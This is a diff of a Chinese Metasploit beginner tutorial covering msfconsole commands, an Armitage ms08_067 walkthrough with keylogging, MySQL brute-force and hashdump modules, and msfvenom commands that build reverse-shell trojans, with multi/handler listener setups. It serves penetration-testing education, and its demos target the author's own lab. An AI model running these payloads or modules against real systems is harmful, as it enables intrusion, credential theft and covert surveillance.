@@ -81,164 +81,187 @@ msfconsole控制终端、armitage图形化界面。
 msfconsole提供了一个一体化的集中控制台。通过msfconsole，你可以访问和使用所有的metasploit的插件，payload，利用模块，post模块等等。msfconsole还有第三方程序的接口，比如nmap，sqlmap等，可以直接在msfconsole里面使用。
 windows打开cmd，linux打开终端，输入msfconsole，然后回车。这样就打开了msfconsole。msfconsole的系统文件和用户文件在linux中位于/usr/share/metasploit-framework/msfconsole目录下。
 
-![框架](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片2.png)
+![linux](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片2.png)
 
 *Linux（kali）平台*
 
-![框架](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片3.png)
+![windows](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片3.png)
 
 *Windows平台*
 当打开msfconsole后，红色的方框里面清楚的标记了Metasploit所有的利用模块、payload、post模块等等。msfconsole有两个查看帮助的选项。一个是msfconsole -h，一个是help。msfconsole –h是显示在msfconsole初始化的选项和参数。而help则是显示进入msfconsole后可以利用的选项。
 msfconsole –h参数
 
-![框架](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片3.png)
+![-h](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片4.png)
 
 ‍‍**全部参数的解释和利用‍‍**  
-‍‍+ help‍‍参数  
-help参数是帮助文档，里面有全部的控制台操作命令解释及注意事项，初学者可以在进入msf控制台后输入help进行查看，在渗透测试中，查看帮助文档很重要，一定要有这个良好的习惯，这样可以提升对未知工具的掌握能力，大多数工具都可以在命令后加-h或--help来获取帮助及用法。当然良好的英文基础也是必要的！
+‍‍**help‍‍参数**  
+help参数是帮助文档，里面有全部的控制台操作命令解释及注意事项，初学者可以在进入msf控制台后输入help进行查看，在渗透测试中，查看帮助文档很重要，一定要有这个良好的习惯，这样可以提升对未知工具的掌握能力，大多数工具都可以在命令后加-h或--help来获取帮助及用法。当然良好的英文基础也是必要的！  
+![help](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片5.png)
+![help](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片6.png)  
+  ‍‍‍‍
+‍‍接下来我要说到msfconsole各个参数的利用和一些解释。  
+‍‍**Back参数‍‍**  
+Back参数主要用于返回。比如你进入了某一个漏洞模块的设置，但是你想再重新选择一个漏洞模块，那么就需要用到back参数。当然不用返回也可以重新选择，use+模块名就行！  
+![back](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片7.png)  
+刚开始我使用了ms08_067_netapi的利用模块，之后使用了back参数返回。
 
+‍‍**Banner参数‍‍**  
+这个主要是查看metasploit的版本信息，利用模块数量、payload数量等等。  
+![banner](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片8.png)   
+‍‍**Check参数‍‍** 
+这个参数可以查看到某些利用模块更相信的信息。主要是用于查看利用模块是否可用攻击目标主机，‍‍事实上，很多的利用模块都不支持这个参数，大多数模块有专门的验证代码，是分开独立的。‍‍  
+![check](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片9.png)  
 
-‍‍‍‍
-‍‍接下来我要说道msfconsole各个参数的利用和一些解释。‍‍
-‍‍Back参数‍‍
-Back参数主要用于返回。比如你进入了某一个漏洞模块的设置，但是你想再重新选择一个漏洞模块，那么就需要用到back参数。当然不用返回也可以重新选择，主需要use+模块名就行！
-这张图说明，才开始我使用了ms08_067_netapi的利用模块，之后使用了back参数返回。
+‍‍**Color参数‍‍**  
+‍‍这个参数主要是设置一些命令行的颜色。没什么实质的作用。‍  
+![check](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片10.png)  ‍
 
-‍‍Banner参数‍‍
-这个主要是查看metasploit的版本信息，利用模块数量、payload数量等等。
+‍‍**Connect参数‍‍**  
+这个参数主要用于远程连接主机。一般用于内网渗透。比较常用的命令就是“connect ip地址 端口号”。  
+![connect](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片11.png)  
 
-‍‍Check参数‍‍
-这个参数可以查看到某些利用模块更相信的信息。主要是用于查看利用模块是否可用攻击目标主机，‍‍事实上，很多的利用模块都不支持这个参数，大多数模块有专门的验证代码，是分开独立的。‍‍
+如果想查看更详细的connect信息，用到之前的方法，直接输入connect –h就可以了。  
+![connect](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片12.png)  
 
-‍‍Color参数‍‍
-‍‍这个参数主要是设置一些命令行的颜色。没什么实质的作用。‍‍
+‍‍**Edit参数‍‍**  
+这个参数的作用就是编辑当前的模块，主要是编辑$VISUAL或者$EDITOR的代码信息。编辑的时候是使用VIM编辑器进行编辑。  
+ 
+‍‍**Exit参数‍‍**  
+这个是退出msfconsole的命令。可以完全退出msfconsole，并且回到linux终端界面。  
+![exit](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片13.png)  
 
-‍‍Connect参数‍‍
-这个参数主要用于远程连接主机。一般用于内网渗透。比较常用的命令就是“connect ip地址 端口号”。
-
-如果想查看更详细的connect信息，用到之前的方法，直接输入connect –h就可以了。
-
-‍‍Edit参数‍‍
-这个参数的作用就是编辑当前的模块，主要是编辑$VISUAL或者$EDITOR的代码信息。编辑的时候是使用VIM编辑器进行编辑。
-‍‍Exit参数‍‍
-这个是退出msfconsole的命令。可以完全退出msfconsole，并且回到linux终端界面。
-
-‍‍Info参数‍‍
+‍‍**Info参数‍‍**  
 这个参数可以查看所在模块的信息，包括选项、利用条件、漏洞作者、可以利用的payload等等。
-这个info有两种用法，第一种是直接在当前的里面模块下输入info，然后回车查看当前模块的信息。
+这个info有两种用法，第一种是直接在当前的里面模块下输入info，然后回车查看当前模块的信息。  
+![edit](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片14.png) 
 
-第二种是输入info后，再在后面输入模块的编号，然后回车查看模块信息。‍‍
+第二种是输入info后，再在后面输入模块的编号，然后回车查看模块信息。‍  
+![info](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片15.png)  
 
-‍‍‍‍Irb参数‍‍‍‍
-这个参数可以进入irb脚本模式，并且执行命令创建脚本。其语言为Ruby。
-‍‍Jobs参数‍‍
-这个参数可以查看目前msfconsole上存在哪些任务，并且可以选择结束一些不需要的任务。如果要查看更详细的jobs选项，那么可以直接输入“jobs -h”进行查看。
+‍‍‍‍**Irb参数‍‍‍‍**  
+这个参数可以进入irb脚本模式，并且执行命令创建脚本。其语言为Ruby。  
+‍‍**Jobs参数‍‍**  
+这个参数可以查看目前msfconsole上存在哪些任务，并且可以选择结束一些不需要的任务。如果要查看更详细的jobs选项，那么可以直接输入“jobs -h”进行查看。  
+![jobs](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片16.png)  
 
-‍‍Kill参数‍‍
-这个参数主要是配合jobs参数进行使用。如果你使用jobs参数后发现了一些不要的任务，那么使用kill参数就可以终止一些不需要的进程。一般都是kill <jobs编号>。
-‍‍Load参数‍‍
-这个参数可以从metasploit的plug库里面加载一些插件。‍‍
-‍‍Unload参数‍‍
-这个参数可以终止你已经启动的插件‍‍。
-‍‍Resource参数‍‍
-这个参数可以运行一些资源文件，有些工具，比如说Karmetasploit无线攻击就很需要这个参数。在后面的文章我会说道怎么使用这个攻击。
-‍‍Route参数‍‍
-‍‍‍Route参数主要是用来当做跳板。在渗透测试中，目标可能是在一个自身路由无法抵达的内网中，这时我们可以通过给自身添加路由表来使目标ip可达，当然需要一个能连到目标的跳板或目标内网的一个肉鸡ip。还有一些代理的高级用法。详见引文：
-http://www.freebuf.com/sectool/56432.html
-‍‍Search参数
+‍‍**Kill参数‍‍**  
+这个参数主要是配合jobs参数进行使用。如果你使用jobs参数后发现了一些不要的任务，那么使用kill参数就可以终止一些不需要的进程。一般都是kill <jobs编号>。  
+‍‍**Load参数‍‍**  
+这个参数可以从metasploit的plug库里面加载一些插件。  
+‍‍**Unload参数‍‍**  
+这个参数可以终止你已经启动的插件‍‍。  
+‍‍**Resource参数‍‍**  
+这个参数可以运行一些资源文件，有些工具，比如说Karmetasploit无线攻击就很需要这个参数。在后面的文章我会说道怎么使用这个攻击。  
+‍‍**Route参数‍‍**  
+‍‍‍Route参数主要是用来当做跳板。在渗透测试中，目标可能是在一个自身路由无法抵达的内网中，这时我们可以通过给自身添加路由表来使目标ip可达，当然需要一个能连到目标的跳板或目标内网的一个肉鸡ip。还有一些代理的高级用法。详见引文：  
+[Metasploit渗透技巧：后渗透Meterpreter代理 ](http://www.freebuf.com/sectool/56432.html)  
+‍‍**Search参数**  
 当你使用msfconsole的时候，你会用到各种漏洞模块、各种插件等等。所以search命令就很重要。我会详细的解释一下这个命令。
-当你输入search –h或者是help search的时候就会列出search命令的一些选项。
-
+当你输入search –h或者是help search的时候就会列出search命令的一些选项。  
+![search](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片17.png)  
 ‍‍通过名称进行查找‍‍
-‍‍这里需要用到name：命令。如果我要查找mysql数据库的漏洞，那么就是输入“search name:mysql”‍‍。
+‍‍这里需要用到name：命令。如果我要查找mysql数据库的漏洞，那么就是输入“search name:mysql”‍‍。  
 ‍‍通过路径进行查找‍‍
-有时候，我们很遇到这么一种情况，就是只记得模块的路径，但是却忘记了模块的名称。那么就可以用path：命令查找在该路径下的所有模块。如果我要mysql路径下的所有mysql利用模块，那么就输入“search path:mysql”。
-
+有时候，我们很遇到这么一种情况，就是只记得模块的路径，但是却忘记了模块的名称。那么就可以用path：命令查找在该路径下的所有模块。如果我要mysql路径下的所有mysql利用模块，那么就输入“search path:mysql”。  
+![search](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片18.png)  
 ‍‍缩小查询范围‍‍
-‍‍有时候我们会搜索到大量的模块，那么可以用platform：命令来缩小查询范围。使用platform命令后，所查询的结果会列出rank比较高的模块。如果我要查找mysql的漏洞，那么输入 “search platform：mysql”。大家对比一下上面的截图，发现没有，所有rank为normal的模块全部都屏蔽了，只剩下几个比较高级的利用模块。
-
+‍‍有时候我们会搜索到大量的模块，那么可以用platform：命令来缩小查询范围。使用platform命令后，所查询的结果会列出rank比较高的模块。如果我要查找mysql的漏洞，那么输入 “search platform：mysql”。大家对比一下上面的截图，发现没有，所有rank为normal的模块全部都屏蔽了，只剩下几个比较高级的利用模块。  
+![search](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片19.png)  
 ‍‍通过类型进行查找‍‍
-这里要使用到type：命令。Metasploit上只有三中模块可以利用，第一种是exploit模块，也就是利用模块。第二种是auxiliary模块。第三种是post模块。所以type命令也就只能搜索这个三种模块类型。如果我要搜索post模块，那么就输入“search type：post”：
-
+这里要使用到type：命令。Metasploit上只有三中模块可以利用，第一种是exploit模块，也就是利用模块。第二种是auxiliary模块。第三种是post模块。所以type命令也就只能搜索这个三种模块类型。如果我要搜索post模块，那么就输入“search type：post”：  
+![search](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片20.png)  
 ‍‍通过模块作者名称进行查找‍‍
-有时候我们会想看看一个作者所写的所有模块，那么就需要用到author：命令。很多人以为这个是多余的，事实不是。后面你们需要编写自己的漏洞模块，通过这个命令，你们就可以迅速的查找到你们自己的模块。如果我要查找dookie写的所有模块，那么就输入“search author：dookie”：
-
-‍‍联合查找‍‍
-大家可以使用上面的参数自行搭配使用。如果我要查找dookie所写的MAC系统的漏洞模块。那么输入“search author:dookie name:MacOS”：
-
-‍‍Sessions参数‍‍
-这个参数可以让大家能够交互，查询或者终止当前的一些会话。如果要查看session的选项，直接输入“sessions -h”即可。这里需要注意的是，命令是sessions，不是session。
-
-‍‍Use参数‍‍
+有时候我们会想看看一个作者所写的所有模块，那么就需要用到author：命令。很多人以为这个是多余的，事实不是。后面你们需要编写自己的漏洞模块，通过这个命令，你们就可以迅速的查找到你们自己的模块。如果我要查找dookie写的所有模块，那么就输入“search author：dookie”：  
+![search](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片21.png)  
+‍‍联合查找‍‍:
+大家可以使用上面的参数自行搭配使用。如果我要查找dookie所写的MAC系统的漏洞模块。那么输入“search author:dookie name:MacOS”：  
+![search](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片22.png)  
+‍‍**Sessions参数‍‍**  
+这个参数可以让大家能够交互，查询或者终止当前的一些会话。如果要查看session的选项，直接输入“sessions -h”即可。这里需要注意的是，命令是sessions，不是session。  
+![sessions](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片23.png)  
+‍‍**Use参数‍‍**  
 这个是使用参数。如你要使用到某个利用模块，payload等，那么就要使用到use参数：
 ‍‍Set参数‍‍
 这个主要是对payload或者其他模块进行设置。比如设置攻击目标的IP就是“set RHOST(大小写不分) 192.168.0.1”：
-‍‍Unset参数‍‍
-如果使用set命令后，发现设置错误了，可以选择unset重新设置。当然也可以通过’set 设置项 “”’来取消。
-
-
-‍‍Setg参数‍‍
-这个和set有些类似，但是不同的是这个是一个全局变量设置。设置一次后再保存，那么以后，这个漏洞模块你就不用重复设置。但是请注意！如果你在某一个模块设置了全局变量，那么以后使用这个模块的时候请检查option选项。以免做重复的渗透工作。当然，如果你设置错误了，也可以用unsetg命令来重新设置。
-
-设置好后再输入save保存你的全局变量设置。
-‍‍Show参数‍‍
+‍‍**Unset参数‍‍**  
+如果使用set命令后，发现设置错误了，可以选择unset重新设置。当然也可以通过’set 设置项 “”’来取消。  
+![unset](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片24.png)
+![unset](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片25.png)  
+‍‍**Setg参数‍‍**  
+这个和set有些类似，但是不同的是这个是一个全局变量设置。设置一次后再保存，那么以后，这个漏洞模块你就不用重复设置。但是请注意！如果你在某一个模块设置了全局变量，那么以后使用这个模块的时候请检查option选项。以免做重复的渗透工作。当然，如果你设置错误了，也可以用unsetg命令来重新设置。  
+![setg](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片26.png)  
+设置好后再输入save保存你的全局变量设置。  
+‍‍**Show参数‍‍**  
 这个命令用的很多。请一定认真看。如果单纯的输入show，那么就会显示出所有的payload，利用模块，post模块，插件等等。但是一般我们都不这么使用。
 如果要显示利用模块，那么就输入show exploits。如果要显示payload，那么就输入show payloads。总共可以使用的是那么几个命令，;show auxiliary;, ;show exploits;, ;show payloads;, ;show encoders;, 和 ;show nops;。
 如果我进去了某一个利用模块后，要查看这个利用模块的可以加载的负荷就输入show payloads。这里可以自由发挥。
 #### 3.2.2 armitage图形化界面
 Armitage是一款基于GUI开发的图形化渗透工具，类似nmap和zenmap的区别，它将msfconsole终端图形化，使操作更简单，适合初学者入门。随着学习的深入，不建议使用armitage进行渗透测试。本文只在此处只是简单的介绍。
 使用：
-在console终端中输入armitage就可以进入界面了。
- 
-题外话：如果出现无法找到msf数据库等问题，打开终端输入命令：
-1./etc/init.d/postgresql start或者service postgresql start；
-2.msfdb init；
-使用Nmap扫描主机操作系统，扫描完后会自动显示系统图标.
-
-点击Find Attacks查找可用的漏洞.
-
+在console终端中输入armitage就可以进入界面了。  
+![armitage](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片27.png)
+![armitage](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片28.png)  
+题外话：如果出现无法找到msf数据库等问题，打开终端输入命令：  
+```
+/etc/init.d/postgresql start或者service postgresql start;  
+msfdb init;
+```
+使用Nmap扫描主机操作系统，扫描完后会自动显示系统图标.  
+![armitage](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片29.png)  
+点击Find Attacks查找可用的漏洞.  
+![armitage](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片30.png)  
 右键目标，选择smb目录下的ms08_067漏洞 ，这里显示的即为可利用漏洞。
-
+![armitage](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片31.png)  
 这里Armitage默认帮我们配置好了，可以直接点击Launch。
- 出现闪电代表攻击成功。
-
-然后选择lsass method，打开Meterpreter。
-
-在命令行中输入shell便可以与目标机器进行交互了。
-
-选择Log Keystrokes进行键盘记录，此处只是选择了一个，当然还可以进行一系列的后渗透操作，比如窃取摄像头等。
+ 出现闪电代表攻击成功。  
+![armitage](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片32.png)
+![armitage](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片33.png)  
+然后选择lsass method，打开Meterpreter。  
+![armitage](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片34.png)  
+在命令行中输入shell便可以与目标机器进行交互了。  
+![armitage](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片35.png)  
+选择Log Keystrokes进行键盘记录，此处只是选择了一个，当然还可以进行一系列的后渗透操作，比如窃取摄像头等。  
+![armitage](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片36.png)  
 
 ### 3.3模块
 上面讲解了接口，现在来说一下模块，在msf中模块可以说贯穿着整个框架，从对目标的信息收集到后面的攻击，都离不开模块的支持。本节主要讲解辅助模块。
 辅助模块位于 安装目录/modules/auxiliary/下，涉及各种辅助模块，有主机发现，端口扫描，服务检测等等，当然辅助模块的大部分功能nmap都可以实现，且效率应该高于msf本身带的辅助模块，因为msf支持程序内调用其它工具。
-在msfconsole里面输入：show auxiliary
-
-
+在msfconsole里面输入：show auxiliary  
+![模块](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片37.png)  
 这里只是一部分，还有很多。
-事例：··扫描同一子网中的活跃主机：
-Use auxiliary/scanner/discovery/arp_sweep
-
+事例：  
++ 扫描同一子网中的活跃主机：  
+```
+Use auxiliary/scanner/discovery/arp_sweep  
+```  
+![模块](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片38.png)  
 （不支持远程网络）
 可以看出有三个ip是活跃的。
-··端口扫描
-Use auxiliary/scanner/portscan/syn
-
-
-线程最好设置成10以上不然很慢！！！
-··相关服务扫描
++ 端口扫描  
+```
+Use auxiliary/scanner/portscan/syn  
+```  
+![模块](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片39.png)
+![模块](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片40.png)  
+线程最好设置成10以上不然很慢！！！  
++ 相关服务扫描  
+```
 Use auxiliary/scanner/telnet/telnet_version(telnet服务版本)
-Use auxiliary/scanner/ssh/ssh_version(ssh服务版本)
-数据库检测及利用：
+Use auxiliary/scanner/ssh/ssh_version(ssh服务版本)  
+```  
++ 数据库检测及利用  
+```
 use auxiliary/scanner/mysql/mysql_version（查看版本）
 use auxiliary/scanner/mysql/mysql_login（对数据库进行暴力破解，数据库允许外连）
 use auxiliary/admin/mysql/mysql_enum（数据库信息枚举）
 use auxiliary/scanner/mysql/mysql_hashdump（数据库用户hash提取）
 use exploit/windows/mysql/mysql_mof（利用数据库用户密码得到一个meterpreter会话）（use exploit/windows/mssql/mssql_payload）也可以
 use auxiliary/admin/mssql/mssql_exec（利用数据库密码得到cmd（高权限）的命令执行）
- 
+```  
 ### 3.4功能程序
 Metasploit框架v4之后提供的功能程序只有msfvenom和msf*scan了，这两个的基本功能和作用在前面的框架介绍中讲过，这里就只讲讲msfvenom，msf*scan因为涉及汇编，调试等基础，所以会在以后的msf高级用法中讲到。v4之前，攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式并进行各种类型的编码需要msfpayload、msfencode和msfvenom协助完成，所以v4之后将它们的功能集成在msfvenom中，所以msfvenom功能很强大！在基础教程中只讲讲用msfvenom生成简单木马，后面的编码等在进阶中会讲到。
-利用msfvenom生成简单木马
+**利用msfvenom生成简单木马**  
+```
 Linux
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 Windows
@@ -268,58 +291,66 @@ Bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
 
 Perl
-msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
-关键参数：set exitonsessions false  防止有效荷载意外关闭（这个命令很有用，在渗透测试中，对方已经成功执行了你的木马，或者exploit攻击模块成功执行，会话已经建立，但是又突然意外关闭，这就是exitonsessions没有设置。）
-3.use exploit/multi/handler
-4.set PAYLOAD <Payload name>
-5.set LHOST <LHOST value>
-6.set LPORT <LPORT value>
-7.set ExitOnSession false
-8.exploit 
+msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl  
+```  
+**关键参数：set exitonsessions false  防止有效荷载意外关闭（这个命令很有用，在渗透测试中，对方已经成功执行了你的木马，或者exploit攻击模块成功执行，会话已经建立，但是又突然意外关闭，这就是exitonsessions没有设置。）**  
+```
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit 
+```  
 
-事例：
-生成exe木马：
-打开cmd，输入：
+**事例**  
+1. 生成exe木马：  
+打开cmd，输入:  
+```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > 输出地址
-这里我因为是演示，就输入本地ip：
+```  
+这里我因为是演示，就输入本地ip：  
+```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f exe > exe.exe
-
-进入msfconsole：
-输入命令：
-9.use exploit/multi/handler
-10.set payload windows/meterpreter/reverse_tcp
-11.set lhost 127.0.0.1
-12.set lport 6666
-13.run
-然后点击exe运行：
-
+```  
+![实例](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片41.png)  
+进入msfconsole,输入命令：  
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 127.0.0.1
+set lport 6666
+run
+```  
+然后点击exe运行：  
+![实例](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片41.png)  
 成功拿到shell，下一步就是对目标机进行一些后续操作了。
-生成php木马：（我自己搭建的php网站，因为在虚拟机，我的网关是192.168.106.1）
-打开cmd输入：
+2. 生成php木马：（我自己搭建的php网站，因为在虚拟机，我的网关是192.168.106.1）
+打开cmd输入：  
+```
 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.106.1 LPORT=6666 -f raw > c:\\php.php
-
-把生成的php.php放到我的网站根目录。
-
+```  
+![实例](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片42.png)  
+把生成的php.php放到我的网站根目录。  
+![实例](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片43.png)  
 真实机进行数据访问：
 进入msfconsole：
-输入命令：
-14.use exploit/multi/handler
-15.set payload php/meterpreter/reverse_tcp
-16.set lhost 192.168.106.1
-17.set lport 6666
-18.run
-然后在真实机访问：
-
-
-
-
-可以看出，连续访问两次会话都是意外关闭，这是没有设置exitonsession这个关键参数！！
-
-生成apk（安卓app）木马：
-原理同上，我不一一列举，可以参见下文：
-手动安卓应用中注入msf后门
-http://www.4hou.com/mobile/5794.html
-简易木马的用途有限，就是自己有对方主机的掌控权，或者对方没有杀软，不然像这种级别的木马是百分之百会被查杀的！！！
+输入命令：  
+```
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.106.1
+set lport 6666
+run
+``` 
+然后在真实机访问：  
+![实例](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片44.png)
+![实例](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片45.png)  
+可以看出，连续访问两次会话都是意外关闭，这是没有设置exitonsession这个关键参数！！  
+3. 生成apk（安卓app）木马：  
+原理同上，我不一一列举，可以参见下文:  
+[手动安卓应用中注入msf后门](http://www.4hou.com/mobile/5794.html)  
+**简易木马的用途有限，就是自己有对方主机的掌控权，或者对方没有杀软，不然像这种级别的木马是百分之百会被查杀的！！！**
 ### 3.5后渗透阶段
 后渗透阶段即拿到目标主机反弹的shell后或者在对目标的渗透中离目标主机所在网络位置更进一步后所处的阶段。这个阶段很关键，涉及到对目标机密数据的窃取，和后门安置以及免杀等方面的操作，也是渗透测试中极为关键的一步，后文的进阶会有专门的专题讲解。在msf中，shell类型也就是payload的类型，Metasploit提供了很多payload，meterpreter算是高级payload了。既然是高级payload当然自有它的优势，meterpreter支持多平台，并且可扩展，纯内存的工作模式，而且支持流量加密，所以meterpreter是metasploit框架中必不可少的部分。
 ? – 帮助菜单
